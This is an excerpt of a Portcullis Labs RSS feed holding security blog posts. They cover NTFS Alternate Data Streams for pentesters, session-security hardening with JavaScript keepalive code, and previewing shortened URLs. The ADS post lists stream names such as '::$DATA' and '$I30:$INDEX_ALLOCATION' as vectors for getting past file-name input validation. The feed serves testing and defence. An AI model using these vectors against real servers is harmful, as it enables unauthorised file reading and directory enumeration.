+<p>Moreover, over the years multiple vulnerabilities have been identified on different products. For example, IIS has had a couple of vulnerabilities relating to ADS (see <a title="CVE-1999-0278" href="https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-1999-0278">CVE-1999-0278</a> and <a title="CVE-2010-2731" href="https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2010-2731">CVE-2010-2731</a>), but what makes things interesting is that the previous vulnerabilities were reported over 10 years apart!. So in short, this feature has been abused by attackers and security researchers over a period of 10 years(!).</p>
+<h2>Which are the internal details of ADS?</h2>
+<p>It seems that NTFS streams were added by Microsoft in order to support the Macintosh <a title="Hierarchical File System" href="https://en.wikipedia.org/wiki/Hierarchical_File_System">Hierarchical File System</a> and the ReFS and Universal Disk Format (UDF) file systems also supports this feature. </p>
+<p>You should note that NTFS streams will be lost if you copy files to a file system that doesn&#8217;t support them (e.g. FAT). If you need more details, feel free to read the Microsoft documentation <a title="here" href="http://msdn.microsoft.com/en-us/library/dn393272.aspx">here</a>.</p>
+<p>As you will see below, NTFS streams are also present on directories, which are a special case. However, as far as I know, its main limitation is that custom streams cannot be created within directories, so we will be limited to reading or deleting directories using the default system stream name.</p>
+<p>Basically, the syntax required to access a NTFS stream is the following:</p>
+<pre class="brush: plain; gutter: false; title: ; notranslate">
+&lt;name&gt;:&lt;stream_name&gt;:&lt;stream_type&gt;
+</pre>
+<ul>
+<li>name refers the the resource, it can be a file (e.g. document.txt) or a folder (e.g. <em>Windows</em>)</li>
+<li>stream_name is the name of our compartment, when working with files, an empty stream name indicates the default stream, when dealing with folders, the default stream name will be &#8220;$I30&#8243;</li>
+<li>stream_type will be always $DATA when dealing with files or $INDEX_ALLOCATION for folders</li>
+</ul>
+<p>When the stream_name is omitted, you are accessing the main stream. For example, the following NTFS streams are equivalent:</p>
+<ul>
+<li>myfile.txt</li>
+<li>myfile.txt:</li>
+<li>myfile.txt::$DATA</li>
+</ul>
+<p>In the case of directories, the following NTFS streams are equivalent:</p>
+<ul>
+<li>mydir</li>
+<li>mydir:$I30:$INDEX_ALLOCATION</li>
+<li>mydir::$INDEX_ALLOCATION</li>
+</ul>
+<h2>How to create ADS</h2>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+echo &quot;test&quot; &gt; myfile:stream
+mkdir &quot;myfolder:$I30:$INDEX_ALLOCATION&quot;
+</pre>
+<h2>How to read ADS</h2>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+more &lt; myfile:stream
+more &lt; myfile:stream:$DATA
+dir C:\Windows:$I30:$INDEX_ALLOCATION
+</pre>
+<h2>How can I enumerate NTFS data streams on Windows?</h2>
+<h3>Powershell</h3>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+get-item -Path d:\* -Stream *
+</pre>
+<h3>Vista and above</h3>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+dir /r
+</pre>
+<h3>Sysinternals</h3>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+streams -s c:
+</pre>
+<h2>Which ADS should I focus while doing penetration test?</h2>
+<p>In short, focus should be put in the following elements:</p>
+<h3>Files</h3>
+<p>The following NTFS streams might help us to bypass the input validation routines when writing/reading files:</p>
+<ul>
+<li>myfile.txt::$DATA (Contains the data stored on myfile.txt)</li>
+<li>myfile.txt:stream:$DATA (Contains the data stored on the ADS called &#8220;stream&#8221;, which is located on myfile.txt)</li>
+</ul>
+<h3>Directory</h3>
+<p>The following attack vectors might allow us to enumerate folders in the remote server or, depending on the implemented input validation routines, perform a more dangerous attacks:</p>
+<ul>
+<li>directory::$DATA</li>
+<li>directory:$I30:$INDEX_ALLOCATION</li>
+<li>directory::$INDEX_ALLOCATION</li>
+</ul>
+<h2>Summary</h2>
+<p>This post explained what NTFS streams are, providing the necessary background to understand attacks using this NTFS feature. In the next post we&#8217;ll see some examples of potential vulnerabilities that we might expect to see in real-life applications.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/ntfs-alternate-data-streams-for-pentesters-part-1/">NTFS Alternate Data Streams for pentesters (part 1)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/ntfs-alternate-data-streams-for-pentesters-part-1/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Improving the security in web sessions (part 2)</title>
+		<link>https://labs.portcullis.co.uk/blog/improving-the-security-in-web-sessions-part-2/</link>
+		<comments>https://labs.portcullis.co.uk/blog/improving-the-security-in-web-sessions-part-2/#comments</comments>
+		<pubDate>Fri, 24 Jan 2014 00:02:38 +0000</pubDate>
+		<dc:creator><![CDATA[JGO]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[SDL]]></category>
+		<category><![CDATA[training]]></category>
+		<category><![CDATA[web]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=2591</guid>
+		<description><![CDATA[<p>The previous post about session management was about how to improve the security of web sessions. An aspect which was not addressed in that post is how to identify that a session is not in active use any more but where the user has manually logged out. For example, a user who was using a [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/improving-the-security-in-web-sessions-part-2/">Improving the security in web sessions (part 2)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>The <a title="previous post" href="/blog/improving-the-security-in-web-sessions/">previous post</a> about session management was about how to improve the security of web sessions. An aspect which was not addressed in that post is how to identify that a session is not in active use any more but where the  user has manually logged out. For example, a user who was using a banking application and closed the tab without logging out the application.<span id="more-2591"></span></p>
+<p>This point is also crucial for web applications because, computers and web browsers are frequently shared between people so it is important that this case cannot be exploited. Identifying when the user stops working with a web application and terminating the session reduces the window of opportunity that surrounds this type of attacks.</p>
+<p>Although web applications should always include a &#8220;Log out&#8221; button, it is even naive to think that all the users are going to close their sessions when they finish to use a web application or before closing the tab/web browser where it was loaded.</p>
+<h2>Using JavaScript events</h2>
+<p>JavaScript allows to control an event which is fired at the moment of a browser window or a browser tab is closed. The name of this event is onbeforeunload. In fact, this event is fired before a page is unloaded, that includes: closing the tab, reloading the page, using the browser&#8217;s navigation buttons, click on a link&#8230;</p>
+<p>The implementation of how the web browser acts when this event is launched depends on the web browser. In general, this event can be used to display a message box asking the user if he wants to close the current page. This message box contains two buttons to allow the user to choose between completing the action, closing the tab, or staying in the page.</p>
+<p>So, in principle, it could be possible to detect when the user is closing the page and then send a request to the server with his confirmation. But the fact is that the majority of the web browsers do not return the control to the JavaScript interpreter before closing the tab; so it is not possible to send the request only in those cases that the user decides that he actually wants to close the tab (the event can always send a request before asking the user, but in few browsers will be able to do it after confirmation).</p>
+<p>It was possible to check that Firefox returns the control to the JavaScript interpreter, but depending on the version, this only works when the page is reloaded, but not when a tab or the browser is closed (tested with versions 23 and 24). In the same way, Opera version 17 will send the logout request when the browser is closed, but not if the user closes is the tab. The rest of the tested browsers (Safari , IE and Chrome) did not send anything if the user confirmed the tab/browser closing.</p>
+<p>The following code is an example about how to implement it:</p>
+<pre class="brush: xml; first-line: 1; title: ; notranslate">
+&lt;html&gt;
+&lt;script src=&quot;http://code.jquery.com/jquery-1.10.2.min.js&quot;&gt;
+
+// Not using JQuery
+/*
+window.onbeforeunload = function () {
+    return  &quot;Are you sure want to LOGOUT the session ?&quot;;
+};
+
+// Used to logout the session , when browser window was closed
+window.onunload = function () {
+    $.get( &quot;http://127.0.0.1/logout&quot; );
+};
+*/
+
+// Using JQuery
+$(window).on('beforeunload', function() {
+        return 'Are you sure want to LOGOUT the session ?';
+});
+
+$(window).unload(function() {
+        $.get( &quot;http://127.0.0.1/logout&quot; );
+});
+&lt;/script&gt;
+
+&lt;body&gt;
+  &lt;h1&gt;&lt;i&gt;Unload&lt;/i&gt; and &lt;i&gt;Beforeunload&lt;/i&gt; example&lt;/h1&gt;
+  Please, reload, close this tab or close the browser to launch the test.
+&lt;/body&gt;
+&lt;/html&gt;
+</pre>
+<p>So, as you would be able to note, this is not a suitable solution to the original problem outlined at the start of this post.</p>
+<h2>Using AJAX ping</h2>
+<p>A better approach, because it should work in any web browser, is to reduce the session timeout configuration in the server to few minutes (2-5 minutes) and to ping the server regularly (15-30 seconds) with an AJAX request. The ping request will maintain the sessions life on the web server, preventing it from being timed out unintentionally. On the other hand, if the user closes the tab or the browser, the session will be terminated by the web server after the determined period.</p>
+<p>The code below is a possible implementation of an AJAX ping using jQuery:</p>
+<pre class="brush: jscript; first-line: 1; title: ; notranslate">
+$(function() { window.setInterval(&quot;$.post('http://example.com/keepAlive');&quot;, 15000); });
+</pre>
+<p>This line should be included in every web page of the application, so it would be a good idea to create a file with it and include the file in the contents of every page served by the web serve.</p>
+<p>With this solution, there are two problems:</p>
+<ul>
+<li>The server will need to be able to support the load of the ping requests which, depending on the number of users, could be thousands each minute. But an application which had that number of users should be able to support that load, so this is not a real problem.</li>
+<li>If the user leaves the application opened in a browser without supervision, the session will never time out.</li>
+</ul>
+<p>The way to fix the second problem is to count the number of pings the server received without any other kind of request and to configure the application to close the session after the corresponding time (idle time). The time limit will need to be longer than the session timeout that has been configured, to avoid those cases of users who are using the application but staying in the same page for a while. For example:</p>
+<p>Imagine that the session timeout was configured to 2 minutes and the delay between pings, 15 seconds. That means that after closing the browser, the session will remain live for 2 minutes maximum before being closed. That is a suitable period of time for the web server to wait before timing the session out because it will tolerate some network or connectivity problems which could in principal cause some of the pings to be lost (8 ping requests would have to be lost to close the session by mistake).</p>
+<p>The major problem is the idle time, which will have to be configured depending on the kind of application. If the web application contains long articles, the idle time should be set to a longer period (5-10 minutes). If the application consists of small pages, then the idle time could be configured to the same as the session timeout (but never shorter).</p>
+<p>By doing this, the application will cover:</p>
+<ul>
+<li>If the tab or web browser is closed, the session will be terminated after session time out (2 minutes in the example).</li>
+<li>If the users leaves the application unattended, the session will be closed after the idle time (at least as long as the session time out but no more than 10 minutes).</li>
+<li>While the user is working with the application, the session will be remain active.</li>
+</ul>
+<p>A last improvement would be to use a variable time out. So it could be configured to the same period as the session time out in most cases but could also be increased for those pages which will take longer to read.</p>
+<p>Editor&#8217;s note: If you enjoyed our two articles on how to improve session management, we&#8217;ve asked the author to put together a good practice guide detailing these and other practical steps that can be employed to help keep your users safe.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/improving-the-security-in-web-sessions-part-2/">Improving the security in web sessions (part 2)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/improving-the-security-in-web-sessions-part-2/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Improving the security in web sessions (part 1)</title>
+		<link>https://labs.portcullis.co.uk/blog/improving-the-security-in-web-sessions/</link>
+		<comments>https://labs.portcullis.co.uk/blog/improving-the-security-in-web-sessions/#comments</comments>
+		<pubDate>Thu, 09 Jan 2014 14:14:18 +0000</pubDate>
+		<dc:creator><![CDATA[JGO]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[SDL]]></category>
+		<category><![CDATA[training]]></category>
+		<category><![CDATA[web]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=2012</guid>
+		<description><![CDATA[<p>Session management is a crucial part of web applications and therefore it is also the target of numerous kinds of attacks. Critical web applications, such as banking applications, require complete control of the users&#8217; sessions to prevent abuses or session hijacking attacks. One way to complicate these types of attack, is for the web application [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/improving-the-security-in-web-sessions/">Improving the security in web sessions (part 1)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>Session management is a crucial part of web applications and therefore it is also the target of numerous kinds of attacks. Critical web applications, such as banking applications, require complete control of the users&#8217; sessions to prevent abuses or session hijacking attacks.<span id="more-2012"></span></p>
+<p>One way to complicate these types of attack, is for the web application to have the complete control of the user session. Typically web applications use a session token, normally in the form of a cookie, to identify sessions but they do not normally check anything else to verify the legitimacy of the session. So if an attacker can retrieve the token used by an authenticated user in some manner, usually the attacker can steal the victim&#8217;s session by sending the retrieved token within each request.</p>
+<p>However, if the web application tightly controls the state of the user inside the application, it would be very difficult for an attacker to steal his session if the user is still interacting with it. Let me explain it with an example:</p>
+<p>Imagine an application whose flow can be represented with the following diagram:</p>
+<p><a name="imageclose-2013"><div class="lb-album"><a href="#image-2013"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/10/FlowDiagram2-300x166.png" alt="FlowDiagram" class="size-medium wp-image-2013 aligncenter"><span></span></a></div>              
+<a href="#imageclose-2013" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-2013">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/10/FlowDiagram2.png" alt="image-2013">
+                   </div></a></p>
+<p>In the initial state, users would not be logged into the application and, until they do so, they will stay in that state. After a login to the application, they get access to the private area of the application where there are 3 different pages. From any of those pages, the user can finish their session by going to the logout page. Inside the private area, users only can browse the pages in the order: 1 -&gt; 2 -&gt; 3 -&gt; 1 -&gt; 2 &#8230; Any other interaction which is not represented by an arrow in the diagram would not be allowed (for example, going from 2 to 1).</p>
+<p>In this context, each session could be represented by the usual session token and the state which the user is in. Doing that, if an attacker was able to retrieve the token in order to attempt to gain access to the application, they would try to access a random state which potentially wouldn&#8217;t correspond with any of the following valid states.</p>
+<p>For example, if the legitimate user is in the state &#8220;Private Page 1&#8243; at the moment of the attack, the only 2 possible next states are &#8220;Private Page 2&#8243; and &#8220;Log out&#8221;. An attacker would need to know this and if they did not, the application could detect the attack and invalidate the session. It is true, that this can be done by exploiting other vulnerabilities, such as a Cross-site Scripting in the application, but if so, the application will store that the new user state is, for example &#8220;Private Page 2&#8243;. Therefore, when the legitimate user tries to get access to the next state (remember that they were actually in the &#8220;Private Page 1&#8243; state), the application will detect the irregularity and will terminate the session.</p>
+<p>Hence, although the attacker would be able to retrieve the token and to perform several requests by discovering the state of the user, the application will identify the problem if the user continues using the application and the states of the user and the attacker become desynchronised.</p>
+<p>In this scenario, an attacker who successfully locates another suitable vulnerability in the web application (the XSS talked above) might be able to identify the state of the user, allowing them to retrieve the token and the state and to refresh the web browser of the user by changing the session token. By doing so, the attacker would be able to use the session but the user will detect that something weird happened as their session will likely be terminated.</p>
+<p>To avoid this situation, the application should protect against the use of concurrent logins. So when the legitimate user logs in again, the application will detect the second session of the same user and will terminate both sessions.</p>
+<p>A limitation of this solution is that legitimate users cannot have more than one tab in the same browser on the same application because each tab would be in different states causing the application to identify the scenario as a possible attack and terminate an otherwise legitimate session. Browsers&#8217; navigation buttons (back and forward) would provoke the same eventualities because the user could change between states in the client side &#8220;bypassing&#8221; the control of the web application.</p>
+<p>In order to implement this, the server side application would need to be designed like a <a title="state machine" href="http://en.wikipedia.org/wiki/Finite-state_machine">state machine</a> where all the relationships between the states are defined. The application will need, therefore, to store the current state of the user inside his session and to check that every request came from the current state and that it is addressed to any of the states which are accessible from the current.</p>
+<p>The tokens used to mitigate <a title="Cross-site Request Forgery (CSRF)" href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)">Cross-site Request Forgery (CSRF)</a> attacks could be used to check the state where the users come from. If the token received by the application with each request matches the token sent to the user previously, this means that the user is coming from a valid state. One of the problem with this approach is that all the requests will need to include the CSRF token (including GET requests) and most libraries do not allow this check for GET requests. Another problem of the usage of the CSRF token is that the solution implemented by many frameworks consists uses one unique token which is sent through all the application but which does not change between requests. In this instance, it would not be possible to differentiate between two different states.</p>
+<p>A different approach could be to check the HTTP header &#8220;Referer&#8221; from each request. In this case, the state could be represented by the URL from where the user is navigating from (remember that this header cannot be trivially manipulated by using JavaScript &#8211; only the web browser has access to it). Alternatively, instead of the &#8220;Referer&#8221; header, an extra hidden field could be added in each form and link which saves the state and preserves it between requests.</p>
+<p>Each approach has its benefits and its problems so probably a mixed solution would be better, using the CSRF to preserve the valid states between requests and checking the &#8220;Referer&#8221; HTTP header to check previous states.</p>
+<p>So, summarising:</p>
+<ul>
+<li>Web session security can be improved by understanding web applications like a state machine and checking the state of each user in each request.</li>
+<li>Advantages: this approach prevents and/or complicate attacks to the session, such as session hijacking. Furthermore, it might complicate the usage of guessable/default accounts if another user is using it because concurrent sessions must be avoided.</li>
+<li>Disadvantages: users cannot use the application in different tabs and the interaction with it is limited to the actions offered in each page, rejecting the usage of web browsers navigation buttons.</li>
+<li>Two possible implementation consist of checking the &#8220;Referer&#8221; HTTP header and/or the CSRF token sent within each request.</li>
+</ul>
+<p>In the next post, I will address another problem relating to web sessions management, how to identify when an user is no longer using the application, and how to close the session as soon as possible.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/improving-the-security-in-web-sessions/">Improving the security in web sessions (part 1)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/improving-the-security-in-web-sessions/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>URL shorteners: What link are you really clicking?</title>
+		<link>https://labs.portcullis.co.uk/blog/url-shorteners-what-link-are-you-really-clicking/</link>
+		<comments>https://labs.portcullis.co.uk/blog/url-shorteners-what-link-are-you-really-clicking/#comments</comments>
+		<pubDate>Wed, 08 Jan 2014 06:40:41 +0000</pubDate>
+		<dc:creator><![CDATA[SWB]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[phishing]]></category>
+		<category><![CDATA[web]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=2705</guid>
+		<description><![CDATA[<p>URL shorteners are a main-stay of Internet use these days, helping users to cut down unsightly long URLs to concise links that can be easily shared. Social media has helped to fuel the popularity of the various services available, but how do you know if you can trust the link you&#8217;re clicking? I&#8217;ve always been [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/url-shorteners-what-link-are-you-really-clicking/">URL shorteners: What link are you really clicking?</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>URL shorteners are a main-stay of Internet use these days, helping users to cut down unsightly long URLs to concise links that can be easily shared. Social media has helped to fuel the popularity of the various services available, but how do you know if you can trust the link you&#8217;re clicking? I&#8217;ve always been wary of shortened links and decided I&#8217;d take a look at how you can check what it is you&#8217;re actually clicking on.<span id="more-2705"></span></p>
+<p>It&#8217;s worth noting that there are numerous browser extensions that will attempt to lengthen short URLs in-situ. While this is probably works well most of the time, it could be open to exploitation (if the extension is coded badly) or subversion. One piece of functionality I&#8217;ve seen in such an extension was to replace the link with the meta data title for the page. This doesn&#8217;t really help if the link leads you to a convincing looking phishing site, complete with fake meta-data.</p>
+<p>I&#8217;ve picked out a sample of what seem to be the most popular shortening services. They are (in no particular order):</p>
+<ul>
+<li>bit.ly</li>
+<li>tinyurl.com</li>
+<li>goo.gl</li>
+<li>is.gd</li>
+<li>tiny.cc</li>
+<li>ow.ly</li>
+</ul>
+<p>I&#8217;ve come up with this list as a result of a quick search and those I&#8217;ve had previous experience with. There are a couple of notable exclusions from the list such as t.co and fb.me, the services run by Twitter and Facebook respectively. I&#8217;ve excluded these (as well as others) as they&#8217;re only used by themselves.</p>
+<p>Twitter&#8217;s shortener, t.co, is only accessible when using twitter it seems and doesn&#8217;t provide any kind of dedicated front-end to view information for a given link. It does however replace some of the text in-line and provides the original URL in the link title which you can see by hovering over the URL.<br />
+Facebook&#8217;s version seems a little&#8230; undocumented. I couldn&#8217;t find a great deal of information on it other than it seems to be used largely for mobile users and (from what little I checked) is only used for linking back to Facebook. One feature I did find however was that it can be used to link to any Facebook page given its alias. For example, <a title="http://fb.me/PortcullisCSL" href="http://fb.me/PortcullisCSL">fb.me/PortcullisCSL</a>.</p>
+<p>I&#8217;ve also only chosen services which are free to use and for obvious reasons I&#8217;m excluding any that you can create using your own domain (Coke has one for example &#8211; cokeurl.com).</p>
+<p>For this post, we&#8217;re going to use https://labs.portcullis.co.uk as our long URL to put through the shorteners.</p>
+<p>Here&#8217;s a list of how our shortened links come out and the associated ways of previewing the actual destination:</p>
+<table>
+<tbody>
+<tr>
+<td>Service</td>
+<td>Short link</td>
+<td>Preview link</td>
+</tr>
+<tr>
+<td>bit.ly</td>
+<td><a title="http://bit.ly/2cx5kA" href="http://bit.ly/2cx5kA">http://bit.ly/2cx5kA</a></td>
+<td><a title="http://bit.ly/2cx5kA+" href="http://bit.ly/2cx5kA+">http://bit.ly/2cx5kA+</a></td>
+</tr>
+<tr>
+<td>tinyurl.com</td>
+<td><a title="http://tinyurl.com/nt79ln4" href="http://tinyurl.com/nt79ln4">http://tinyurl.com/nt79ln4</a></td>
+<td><a title="http://preview.tinyurl.com/nt79ln4" href="http://preview.tinyurl.com/nt79ln4">http://preview.tinyurl.com/nt79ln4</a></td>
+</tr>
+<tr>
+<td>goo.gl</td>
+<td><a title="http://goo.gl/cgc0Wb" href="http://goo.gl/cgc0Wb">http://goo.gl/cgc0Wb</a></td>
+<td><a title="http://goo.gl/#analytics/goo.gl/cgc0Wb/all_time" href="http://goo.gl/#analytics/goo.gl/cgc0Wb/all_time">http://goo.gl/#analytics/goo.gl/cgc0Wb/all_time</a></td>
+</tr>
+<tr>
+<td>is.gd</td>
+<td><a title="http://is.gd/ObGfiX" href="http://is.gd/ObGfiX">http://is.gd/ObGfiX</a></td>
+<td><a title="http://is.gd/ObGfiX-" href="http://is.gd/ObGfiX-">http://is.gd/ObGfiX-</a></td>
+</tr>
+<tr>
+<td>tiny.cc</td>
+<td><a title="http://tiny.cc/43z67w" href="http://tiny.cc/43z67w">http://tiny.cc/43z67w</a></td>
+<td><a title="http://tiny.cc/43z67w~" href="http://tiny.cc/43z67w~">http://tiny.cc/43z67w~</a></td>
+</tr>
+<tr>
+<td>ow.ly</td>
+<td><a title="http://ow.ly/rObWZ" href="http://ow.ly/rObWZ">http://ow.ly/rObWZ</a></td>
+<td>Couldn&#8217;t find a way to expand the URL.</td>
+</tr>
+</tbody>
+</table>
+<p>In summary; bit.ly, is.gd and tiny.cc all have nice simple ways of taking a look, you just have to add a character onto the end (providing you pick the right one). Google&#8217;s service seems like the most complicated requiring the knowledge of the correct runes, and I couldn&#8217;t find a way to preview ow.ly.</p>
+<p>When writing this post, I was pointed at a bit of quick Perl that <a title="Tim" href="/author/tmb/">Tim</a> wrote a little while ago to assist in a test which will follow a short link and print out each redirect it encounters along the way. This is particularly useful if your chosen link leads you to yet another URL shortener service.</p>
+<pre class="brush: perl; title: ; notranslate">
+#!/usr/bin/perl
+
+use strict;
+use LWP;
+
+my $url;
+my $redirectflag;
+my $httphandle;
+my $requesthandle;
+my $responsehandle;
+
+sub usage {
+        die &quot;usage: &quot; . basename($0) . &quot; &quot;;
+}
+
+if (@ARGV != 1) {
+        usage();
+}
+$url = shift;
+$httphandle = LWP::UserAgent-&gt;new(max_redirect =&gt; 0);
+$httphandle-&gt;agent(&quot;Mozilla/5.0 (compatible; resolveurl.pl 0.1)&quot;);
+$redirectflag = 1;
+while ($redirectflag == 1) {
+        $redirectflag = 0;
+        $requesthandle = HTTP::Request-&gt;new(HEAD =&gt; $url);
+        $responsehandle = $httphandle-&gt;request($requesthandle);
+        if ($responsehandle-&gt;is_redirect) {
+                $url = $responsehandle-&gt;header(&quot;location&quot;);
+                print $url . &quot;\n&quot;;
+                $redirectflag = 1;
+        }
+}
+</pre>
+<p>Lastly, I&#8217;ve decided to make a quick mention of adf.ly which was pointed out to me by a colleague. This is a service for presenting ads before sending users onto the end URL. From a quick look, there didn&#8217;t appear any way in which to preview the URL you were being sent to. Given that following one of their links will present you with a third party ad could have its own implications. But that&#8217;s for another post.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/url-shorteners-what-link-are-you-really-clicking/">URL shorteners: What link are you really clicking?</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/url-shorteners-what-link-are-you-really-clicking/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+	</channel>
+</rss>
